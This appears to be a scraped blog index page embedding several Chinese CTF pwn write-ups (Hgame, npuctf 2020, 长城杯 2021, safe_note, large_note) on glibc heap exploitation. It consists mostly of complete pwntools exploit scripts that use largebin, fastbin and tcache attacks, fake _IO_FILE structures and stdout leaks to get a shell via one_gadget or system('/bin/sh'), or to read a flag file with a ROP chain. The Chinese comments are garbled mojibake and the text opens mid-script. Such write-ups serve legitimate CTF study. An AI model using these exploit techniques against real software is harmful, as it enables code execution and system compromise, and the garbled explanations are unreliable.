    fake_file += p16(0)  # _cur_column
    fake_file += p8(0)  # _vtable_offset
    fake_file += p8(0x10)  # _shortbuf
    fake_file += p32(0)
    fake_file += p64(0)  # _lock
    fake_file += p64(0)  # _offset
    fake_file += p64(0)  # _codecvt
    fake_file += p64(_wide_data)  # _wide_data
    fake_file += p64(0)  # _freeres_list
    fake_file += p64(0)  # _freeres_buf
    fake_file += p64(0)  # __pad5
    fake_file += p32(0)  # _mode
    fake_file += p32(0)  # unused2
    fake_file += p64(0) * 2  # unused2
    fake_file += p64(vtable)  # vtable
    return fake_file


add(0,0x608) #fake_wide_data
add(1,0x550) #fake_chain ÂèØÊéßÂ§ßÂ†ÜÂùó
add(2,0x600)
add(3,0x540) #Â∞èÂ†ÜÂùó
add(4,0x600)


### leak libc_addr
delete(1)
show(1)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x1f6cc0
tmp=leak_addr+0x1f6cc0+0x4b0
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
###

pop_rdi=leak_addr+0x23ba5
pop_rsi=leak_addr+0x251fe
pop_rdx_rbx=leak_addr+0x8bbb9
pop_rax=leak_addr+0x3f923
ret=leak_addr+0x22d19
_IO_list_all=leak_addr+libc.sym[b&amp;quot;_IO_list_all&amp;quot;]
_IO_wfile_jumps=leak_addr+libc.sym[b&amp;quot;_IO_wfile_jumps&amp;quot;]
setcontext_61=leak_addr+libc.sym[b&amp;quot;setcontext&amp;quot;]+0x3d
open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
magic_gadget=leak_addr+0x160cb6
&#39;&#39;&#39;
mov rdx, qword ptr [rax + 0x38];
mov rdi, rax; 
call qword ptr [rdx + 0x20];
&#39;&#39;&#39;


### leak heap_addr 
add(5,0x900) #fake_jump 0x1f70
edit(1,b&amp;quot;a&amp;quot;*0xf+b&amp;quot;b&amp;quot;)
show(1)
io.recvuntil(b&amp;quot;b&amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x8a0
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))


### largebin attack
delete(3)
edit(1,p64(tmp)*2+p64(0)+p64(_IO_list_all-0x20))
add(6,0x900)
###
add(7,0x540) #Â∞ÜÂ∞èÂ†ÜÂùóÁî≥ËØ∑Âá∫Êù•ÔºåËøõË°åunlinkÔºå‰ΩøÂæó_IO_list_all_chainÁöÑÂú∞ÂùÄÊòØÂèØÊéßÁöÑÂ§ßÂ†ÜÂùóÁöÑÂú∞ÂùÄÔºåÂê¶Âàô‰º™ÈÄ†fake_fileÂú∞ÂùÄÈùûÊ≥ï


# ÂØπfpÁöÑËÆæÁΩÆÂ¶Ç‰∏ãÔºö
# _flagsËÆæÁΩÆ‰∏∫~(2 | 0x8 | 0x800)ÔºåÂ¶ÇÊûú‰∏çÈúÄË¶ÅÊéßÂà∂rdiÔºåËÆæÁΩÆ‰∏∫0Âç≥ÂèØÔºõÂ¶ÇÊûúÈúÄË¶ÅËé∑ÂæóshellÔºåÂèØËÆæÁΩÆ‰∏∫sh;ÔºåÊ≥®ÊÑèÂâçÈù¢Êúâ‰∏§‰∏™Á©∫Ê†º
# vtableËÆæÁΩÆ‰∏∫_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmapÂú∞ÂùÄÔºàÂä†ÂáèÂÅèÁßªÔºâÔºå‰ΩøÂÖ∂ËÉΩÊàêÂäüË∞ÉÁî®_IO_wfile_overflowÂç≥ÂèØ
# _wide_dataËÆæÁΩÆ‰∏∫ÂèØÊéßÂ†ÜÂú∞ÂùÄAÔºåÂç≥Êª°Ë∂≥*(fp + 0xa0) = A
# _wide_data-&amp;gt;_IO_write_baseËÆæÁΩÆ‰∏∫0ÔºåÂç≥Êª°Ë∂≥*(A + 0x18) = 0
# _wide_data-&amp;gt;_IO_buf_baseËÆæÁΩÆ‰∏∫0ÔºåÂç≥Êª°Ë∂≥*(A + 0x30) = 0
# _wide_data-&amp;gt;_wide_vtableËÆæÁΩÆ‰∏∫ÂèØÊéßÂ†ÜÂú∞ÂùÄBÔºåÂç≥Êª°Ë∂≥*(A + 0xe0) = B
# _wide_data-&amp;gt;_wide_vtable-&amp;gt;doallocateËÆæÁΩÆ‰∏∫Âú∞ÂùÄCÁî®‰∫éÂä´ÊåÅRIPÔºåÂç≥Êª°Ë∂≥*(B + 0x68) = C


#edit _flags ~(2 | 0x8 | 0x800)
# edit(0,b&amp;quot;\x00&amp;quot;*0x600+p64((~(2 | 0x8 | 0x800))&amp;amp;0xffffffffffffffff))

#fake_wide_data
fake_wide_data=heap_addr+0x2a0
flag_addr=heap_addr+0x2a0

edit(1,build_fake_file(0,_IO_wfile_jumps,fake_wide_data,0))
fake_jump=heap_addr+0x1f70


_wide_data=b&amp;quot;./flag\x00\x00&amp;quot;
_wide_data=_wide_data.ljust(0x18,b&amp;quot;\x00&amp;quot;)+p64(0)
_wide_data=_wide_data.ljust(0x30,b&amp;quot;\x00&amp;quot;)+p64(0)
_wide_data=_wide_data.ljust(0xe0,b&amp;quot;\x00&amp;quot;)+p64(fake_jump)
edit(0,_wide_data)


# gdb.attach(io)
# pause()


#open
orw=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x4000)+p64(pop_rdx_rbx)+p64(0x50)+p64(0)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x4000)+p64(pop_rdx_rbx)+p64(0x50)+p64(0)+p64(write_a)

payload=p64(setcontext_61)+p64(fake_jump-0x10)*10+p64(magic_gadget) #C -&amp;gt; magic_gadget
payload+=b&amp;quot;\x00&amp;quot;*0x20+p64(heap_addr+0x2010) #orw_addr
payload+=p64(ret)+orw
#Ëøô‰∏ÄÂù®‰πãÊâÄ‰ª•Ë°åÔºåÈ¶ñÂÖàfake_wide_dataËÆæÁΩÆÁöÑfake_jump+0x68Ë∑≥ËΩ¨ÊâßË°åmagic_gadget
#ÂΩìÊàë‰ª¨editÊó∂ÔºåÂÖ∂‰∏≠ÁöÑreadÂáΩÊï∞Â∞ÜËØªÂÖ•ÁöÑÊï∞ÊçÆÂú∞ÂùÄÂ≠òÂà∞raxÂØÑÂ≠òÂô®‰∏≠‰∫ÜÔºåÂàôrdxÂØÑÂ≠òÂô®ÁöÑÂÄºÂèò‰∏∫[rax+0x38]ÔºåÂç≥fake_jump-0x10Â§Ñ
#Ê≠§Êó∂call qword ptr [rdx + 0x20]ÂÖ∂ÂÆûË∞ÉÁî®ÁöÑÊòØsetcontext+61,Âπ∂‰∏îÊ≠§Êó∂rspÂÄº‰∏∫[rdx+0xa0]ÔºåÂç≥heap_addr+0x1d10
#heap_addr+0x1d10ÁöÑÂú∞ÂùÄÂç≥‰∏∫orwÁöÑÂú∞ÂùÄÔºåretÁ≠âÊïàpop ripÔºå‰ªéËÄåÊâßË°åorw


edit(5,payload)
exit()

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">Hgame week4 Â§çÁé∞</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/DLuwxEhs1/"" data-c="
          &lt;p&gt;‰∏ÄÈÅìÂ†ÜÈ£éÊ∞¥È¢òÁõÆÔºå10Ê¨°add&lt;br&gt;
ÊØèÊ¨°Âè™ËÉΩÁî≥ËØ∑0x100Êàñ0x60Â§ßÂ∞èÂ†ÜÂùó&lt;br&gt;
Â≠òÂú®&lt;code&gt;bargain&lt;/code&gt;ÂáΩÊï∞ÂèØ‰ª•‰øÆÊîπfdÔºàÂÅöÂáèÊ≥ïÔºåÈôêÂà∂Â§ßÂ∞è0x10ÔºåÂèØ‰ª•ËæìÂÖ•Ë¥üÊï∞ÂèçÂêë‰øÆÊîπ&lt;br&gt;
ÈáçÁÇπÂú®‰∫éÊûÑÈÄ†tcacheÈìæÂÆûÁé∞‰ªªÊÑèÂú∞ÂùÄÁî≥ËØ∑    (&lt;s&gt;Â§¥Â§ß&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28973)
io=process(&amp;quot;./gift&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(n,cc):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;gift!\n&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;index?\n&amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;index?\n&amp;quot;,str(n))

def edit_off(n,s):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;5&amp;quot;)
    io.sendlineafter(b&amp;quot;index?\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;much?\n&amp;quot;,str(s))

gdb.attach(io)
pause()

add(1,b&amp;quot;\x00&amp;quot;) #0x100 0
add(1,b&amp;quot;\x00&amp;quot;) #0x100 1
delete(0)
delete(1)

show(1)
io.recvuntil(b&amp;quot;cost: &amp;quot;)
heap_addr=int(io.recv(14),10)-0x260
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

add(1,cyclic(0x10)+p64(heap_addr+0x400)+cyclic(0x68)+p64(heap_addr+0x410)) #1
add(1,p64(heap_addr+0x390)) #0

delete(0)
delete(1)
edit_off(1,-0x10)

add(1,b&amp;quot;\x00&amp;quot;)
add(1,b&amp;quot;\x00&amp;quot;)
add(1,b&amp;quot;\x00&amp;quot;)

delete(0)
show(0)

io.recvuntil(b&amp;quot;cost: &amp;quot;)
leak_addr=int(io.recv(16),10)-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
shell=leak_addr+one_gadget[1]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

add(1,p64(free_hook-0x10))
add(1,b&amp;quot;\x00&amp;quot;)
add(1,p64(shell))

delete(1)

io.interactive()

# 0x4f2a5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f302 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">[Â∑ÖÂ≥∞ÊûÅÂÆ¢ 2022]Gift wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/gnmApmq5l/"" data-c="
          &lt;h3 id=&#34;npuctf_2020_bad_guy&#34;&gt;npuctf_2020_bad_guy&lt;/h3&gt;
&lt;p&gt;Á¨¨‰∏ÄÊ¨°ÂÅö&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt;Ê≥ÑÈú≤libcÁöÑÈ¢ò&lt;br&gt;
64‰ΩçÔºå‰∏çËÉΩÊ≠£Â∏∏dumpÂá∫libcÂü∫ÂùÄÔºåËÄÉËôëÂ∞ÜÂ†ÜÂùóÁî≥ËØ∑Âà∞&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt;Â§Ñ‰øÆÊîπ&lt;code&gt;_flags&lt;/code&gt;Âíå&lt;code&gt;_IO_2_1_write_base&lt;/code&gt;Ê≥ÑÈú≤libc&lt;br&gt;
Áî±‰∫éeditÂ†ÜÊ∫¢Âá∫Ôºå‰øÆÊîπunsortedbin fdÊåáÈíàÔºàÁàÜÁ†¥‰Ωé‰∫åÂ≠óËäÇÔºâÂêéÂàÜÈÖç0x10Â§ßÂ∞èÂ†ÜÂùó‰ΩøÂâ©‰ΩôÂ†ÜÂùóËøõÂÖ•fastbinÔºåÁî≥ËØ∑Â†ÜÂùóÂà∞&lt;code&gt;_IO_2_1_stdout_-0x43&lt;/code&gt;Â§ÑÔºàÊ≠§Â§Ñ0x7fË∑üfastbin attack‰º™ÈÄ†fake chunkÂêåÁêÜ&lt;br&gt;
Ê≠§Êó∂‰øÆÊîπ&lt;code&gt;_IO_2_1_write_base&lt;/code&gt;Âíå&lt;code&gt;_flags&lt;/code&gt;Ôºå&lt;code&gt;_flags&lt;/code&gt;‰øÆÊîπ‰∏∫&lt;code&gt;0xfbad1887&lt;/code&gt;Âç≥ÂèØÁªïËøáÊâÄÊúâÊ£ÄÊü•Ôºå&lt;code&gt;_IO_2_1_write_base&lt;/code&gt;‰Ωé‰ΩçË¶ÜÁõñ‰∏∫&lt;code&gt;\x00&lt;/code&gt;Âç≥ÂèØÔºå‰øùËØÅ&lt;code&gt;_IO_2_1_write_base&lt;/code&gt;Â∞è‰∫é&lt;code&gt;_IO_2_1_write_ptr&lt;/code&gt;&lt;br&gt;
‰πãÂêé‰ªªÊÑèÊâßË°å‰∏ÄÊ¨°&lt;code&gt;puts&lt;/code&gt;ÂáΩÊï∞Âç≥ÂèØÊ≥ÑÈú≤libcÂü∫ÂùÄ&lt;br&gt;
ÊúÄÂêéÂà©Áî®Ê≥ÑÈú≤ÁöÑlibcÂü∫ÂùÄÔºåÂä´ÊåÅÂà©Áî®fastbin attackÂä´ÊåÅ&lt;code&gt;malloc_hook&lt;/code&gt;Êâìone_gadgetÂç≥ÂèØ&lt;br&gt;
Ê≥®ÊÑèÊ≠§È¢òÁöÑglibcÁâàÊú¨‰∏∫&lt;code&gt;2.23-0ubuntu11&lt;/code&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25428)
io=process(&amp;quot;./npuctf_2020_bad_guy&amp;quot;)
elf=ELF(&amp;quot;./npuctf_2020_bad_guy&amp;quot;)
libc=ELF(&amp;quot;libc-2.23.so&amp;quot;)

one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))
    io.sendafter(b&amp;quot;Content:&amp;quot;,cc)
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))
    io.sendafter(b&amp;quot;content: &amp;quot;,cc)
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    
gdb.attach(io)
pause()  
    
add(0,0x10,b&amp;quot;aaa&amp;quot;)
add(1,0x10,b&amp;quot;bbb&amp;quot;)
add(2,0x60,b&amp;quot;ccc&amp;quot;)
add(3,0x10,b&amp;quot;ddd&amp;quot;)

delete(2)

payload=cyclic(0x18)+p64(0x91)
edit(0,len(payload),payload)

delete(1)

add(4,0x10,b&amp;quot;bbb&amp;quot;)

payload=p64(0)*3+p64(0x71)+b&amp;quot;\xdd\x55&amp;quot;
edit(4,len(payload),payload)

add(5,0x60,b&amp;quot;eee&amp;quot;)

payload=b&amp;quot;\x00&amp;quot;*0x33+p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;

add(6,0x60,payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-192-libc.sym[b&amp;quot;_IO_2_1_stderr_&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
shell=leak_addr+one_gadget[3]

add(7,0x60,b&amp;quot;aaa&amp;quot;)
delete(7)

payload=p64(0)*3+p64(0x71)+p64(malloc_hook-0x23)
edit(4,len(payload),payload)

add(8,0x60,b&amp;quot;qqq&amp;quot;)
add(9,0x60,cyclic(0x13)+p64(shell))
# add(7,0x60,b&amp;quot;ooo&amp;quot;)
io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Index :&amp;quot;,b&amp;quot;7&amp;quot;)
io.sendlineafter(b&amp;quot;size: &amp;quot;,b&amp;quot;18&amp;quot;)

io.interactive()

# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;2021-ÈïøÂüéÊùØ_Èô¢Ê†°ÁªÑk1ng_in_h3ap_i&#34;&gt;[2021 ÈïøÂüéÊùØ_Èô¢Ê†°ÁªÑ]K1ng_in_h3ap_I&lt;/h3&gt;
&lt;p&gt;Âà©Áî®Ê≥ÑÈú≤ÁöÑprintfÁöÑÂü∫ÂùÄÊé®ÁÆóÂ§Ñstdout-0x43Â§ÑÂú∞ÂùÄÔºå‰øÆÊîπfastbin fd‰Ωé3Â≠óËäÇÊâìfastbin attack&lt;br&gt;
ÁÑ∂ÂêéÂà©Áî®&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt;Ê≥ÑÈú≤libc&lt;br&gt;
ÊúÄÂêéreallocË∞ÉÊ†àÊâìone_gadget&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28714)
# io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(n,s):
    io.sendlineafter(&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,&amp;quot;1&amp;quot;)
    io.sendlineafter(&amp;quot;index:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;index:\n&amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;index:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;context:\n&amp;quot;,cc)
    
def mg():
    io.sendlineafter(&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,&amp;quot;666&amp;quot;)

# gdb.attach(io)
# pause()

mg()
io.recvuntil(b&amp;quot;0x&amp;quot;)
low_bytes=int(io.recv(6),16)
print(&amp;quot;low bytes: &amp;quot;+hex(low_bytes))
stdout=low_bytes+0x36fe10
print(&amp;quot;stdout: &amp;quot;+hex(stdout))

add(0,0x60)
add(1,0x90)
add(2,0x60)
add(3,0x60)

delete(1)
add(4,0x60)
edit(4,p64(stdout-0x43)[:3])
delete(0)
delete(2)
edit(2,b&amp;quot;\x70&amp;quot;)

add(5,0x60)
add(6,0x60)
add(7,0x60)

payload=b&amp;quot;\x00&amp;quot;*0x33+p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;
edit(7,payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-192-libc.sym[b&amp;quot;_IO_2_1_stderr_&amp;quot;]
print(&amp;quot;leak addr: &amp;quot;+hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
realloc=leak_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=leak_addr+one_gadget[1]

add(8,0x60)
delete(3)
edit(3,p64(malloc_hook-0x23))
add(9,0x60)
add(10,0x60)
edit(10,cyclic(0xb)+p64(shell)+p64(realloc+0xc))

delete(9)
add(9,0x60)

io.interactive()

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">‰∏§ÈÅìfastbin attack+_IO_2_1_stdout_</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/9EpvUJ1LN0/"" data-c="
          &lt;h2 id=&#34;pwn&#34;&gt;PWNÔºö&lt;/h2&gt;
&lt;h3 id=&#34;safe_note&#34;&gt;safe_note:&lt;/h3&gt;
&lt;p&gt;2.32Âä†ÂÖ•ÁöÑÂºÇÊàñÂä†ÂØÜ&lt;br&gt;
&lt;code&gt;e-&amp;gt;next = PROTECT_PTR (&amp;amp;e-&amp;gt;next, tcache-&amp;gt;entries[tc_idx])&lt;/code&gt;&lt;br&gt;
PROTECT_PTRÊìç‰ΩúÂ∞±ÊòØÂÖàÂØπposÔºànextÂüüÁöÑÂ†ÜÂùóÂú∞ÂùÄÔºâÂè≥Áßª‰∫Ü12‰ΩçÔºåÂÜçÂ∞Ü‰∏éÂéüÂÖàÁöÑÊåáÈíàÔºàÂú®Ê≠§ÁâàÊú¨‰πãÂâçfd/nextÂÇ®Â≠òÁöÑÂÜÖÂÆπÔºâÂºÇÊàñÂæóÂà∞ÁöÑÁªìÊûúÂ≠òÂÖ•next„ÄÇ&lt;br&gt;
ÂΩìfastbinÊàñtcachebinÂè™Êúâ1‰∏™chunkÊó∂ÔºånextÁöÑÂÄº‰∏∫0ÔºåÊ≠§Êó∂&lt;code&gt;(pos&amp;gt;&amp;gt;12)^0==(pos&amp;gt;&amp;gt;12)&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#define PROTECT_PTR(pos, ptr) \
((__typeof (ptr)) ((((size_t) pos) &amp;gt;&amp;gt; 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;amp;ptr, ptr)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âè¶Â§ñÊ≥ÑÈú≤ÁöÑ&lt;code&gt;main_arena+0x60&lt;/code&gt;Â§ÑÁöÑÂú∞ÂùÄÊúÄÈ´ò‰Ωç‰∏∫&lt;code&gt;\x00&lt;/code&gt;ÈúÄË¶ÅË¶ÜÁõñ‰∏∫ÂÖ∂‰ªñÂÄºÊ≥ÑÈú≤&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./vuln&amp;quot;)
# io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28133)
libc=ELF(&amp;quot;./libc-2.32.so&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Content: &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

for i in range(8):
    add(i,0x90)
    
add(8,0x10)

for i in range(8):
    delete(i)
    
edit(7,b&amp;quot;&amp;quot;)
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]-0xa
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

show(0)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr:  &amp;quot;+hex(heap_addr))
      
free_hook_key=free_hook^key
edit(6,p64(free_hook_key))

# gdb.attach(io)
# pause()

add(9,0x90)
edit(9,b&amp;quot;/bin/sh&amp;quot;)
add(10,0x90)
edit(10,p64(sys_addr))

delete(9)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;large_note&#34;&gt;large_note:&lt;/h3&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#Ê≥®ÊÑè0x10Â≠óËäÇÂØπÈΩê
from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28607)
io=process(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.32.so&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
add(0,0x520)
add(1,0x600)
add(2,0x510)

delete(0)
edit(0,b&amp;quot;a&amp;quot;)
show(0)   #uafÊ≥ÑÈú≤libc

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x61-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
mp_=leak_addr+0x1e3280   
tc_max_bins=mp_+0x50  #mp_.tcache_bins

edit(0,b&amp;quot;\x00&amp;quot;)
add(13,0x900)   #Â∞Üchunk0ÂàÜÈÖçÂà∞largebin

payload=p64(leak_addr+0x1e4030)*2+p64(tc_max_bins-0x20)*2  #Ê≥®ÊÑèÊ£ÄÊü•Ôºå‰øÆÊîπchunk 0ÁöÑbk_nextsize‰∏∫tc_max_bins - 0x20Â§ÑÔºåÊù•ËææÂà∞‰ªªÊÑèÂú∞ÂùÄÂÜô‰∏Ä‰∏™Â†ÜÂùóÂú∞ÂùÄ

